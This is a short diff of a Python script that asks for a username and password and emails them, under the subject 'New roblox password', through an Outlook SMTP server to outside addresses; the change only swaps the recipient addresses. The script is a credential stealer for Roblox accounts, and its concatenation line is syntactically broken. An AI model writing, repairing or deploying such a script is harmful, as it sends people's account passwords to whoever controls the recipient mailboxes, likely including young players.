@@ -3,7 +3,7 @@ username = input("Enter username:")
 password = input("Enter password:")
 SERVER = "smtp.outlook.live.com"
 FROM = "gamingizfun@outlook.com"
-TO = ["pegiunfriend@outlook.com", "ari.pdx@icloud.com"]
+TO = ["anthonybelle2013@hotmail.com", "anthonybelle1212@gmail.com"]
 
 SUBJECT = "New roblox password"
 TEXT = "New roblox password!, username is" + username "password is" +  password "Goto roblox.com"
